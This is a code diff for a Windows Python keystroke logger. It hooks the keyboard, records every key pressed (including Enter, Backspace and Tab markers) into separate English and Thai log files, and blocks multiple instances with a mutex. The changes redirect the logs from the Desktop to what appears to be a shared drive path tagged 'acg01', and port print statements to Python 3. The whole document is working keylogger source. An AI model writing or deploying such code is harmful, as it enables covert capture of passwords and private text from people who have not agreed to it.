@@ -8,15 +8,22 @@ import pythoncom #form pywin32
 import datetime,time
 import win32event, win32api, winerror
 import ctypes
-from _winreg import *
 
 #Disallowing Multiple Instance
 #more : https://msdn.microsoft.com/en-us/library/windows/desktop/ms686927(v=vs.85).aspx
 
+#-----------------path setting----------------
+#path_txten="C:/Users/lenovo/Desktop/log_en.txt"
+#path_txtth="C:/Users/lenovo/Desktop/log_th.txt"
+path_txten="P:/path_console/log_en_acg01.txt"
+path_txtth="P:/path_console/log_th_acg01.txt"
+#---------------------------------------------
+
+
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    print "Multiple Instance not Allowed"
+    print("Multiple Instance not Allowed")
     exit(0)
 
 
@@ -27,6 +34,8 @@ data_th=""
 flag_cl=0
 
 #x=""
+
+
 
 #check language and setting flag_cl
 def checklanguage():
@@ -40,7 +49,7 @@ def checklanguage():
     klid = user32.GetKeyboardLayout(thread_id)
     lid = klid & (2**16 - 1)
     lid_hex = hex(lid)
-    print("current hex language",lid_hex)
+    print(("current hex language",lid_hex))
 
     if(lid_hex=="0x409"):
         print("setting en")
@@ -59,30 +68,30 @@ def keypressed(event):
     global flag_cl
     #global x
     if event.Ascii==13:
-        keys='<ENTER>'
+        keys='\n<ENTER>\n'
     elif event.Ascii==8:
-        keys='<BACK SPACE>'
+        keys='\n<BACK SPACE>\n'
     elif event.Ascii==9:
-        keys='<TAB>'
+        keys='\n<TAB>\n'
     elif event.Ascii==96:
         if(flag_cl==1):
             flag_cl=2
-            keys='<CHANGE TH>'
+            keys='\n<CHANGE TH>\n'
         else:
             flag_cl=1
-            keys='<CHANGE EN>'
+            keys='\n<CHANGE EN>\n'
     elif event.Ascii==113:
         sys.exit()
     else:
         keys=chr(event.Ascii)
-        print("ascii:",event.Ascii,"keys:",keys)
+        print(("ascii:",event.Ascii,"keys:",keys))
 
     if flag_cl==1:
         data_en=data_en+keys
     elif flag_cl==2:
         data_th=data_th+keys
     else:
-        print("flag is not setting>",flag_cl)
+        print(("flag is not setting>",flag_cl))
         sys.exit()
     #if x==1:  
         #some choice ex.local 
@@ -90,15 +99,17 @@ def keypressed(event):
     #can create another choice----
 
 def local():
+    global path_txten
+    global path_txtth
     global data_en
     global data_th
     global flag_cl
-    print("in local data en:",len(data_en))
-    print("in local data th:",len(data_th))
+    print(("in local data en:",len(data_en)))
+    print(("in local data th:",len(data_th)))
     if ((len(data_en)>10) or (len(data_th)>10)):
         if flag_cl == 1:
             print("write en")
-            fp=open("C:\Users\lenovo\Desktop\log_en.txt","a")
+            fp=open(path_txten,"a")
             fp.write(data_en)
             fp.write("\n")
             fp.close()
@@ -106,7 +117,7 @@ def local():
             
         elif flag_cl == 2: 
             print("write th")
-            fp=open("C:\Users\lenovo\Desktop\log_th.txt","a")
+            fp=open(path_txtth,"a")
             fp.write(data_th)
             fp.write("\n")
             fp.close()
@@ -114,6 +125,8 @@ def local():
         else:
             print("flag is have problem..")
     return True
+
+
 
 def main():
     print("in main")
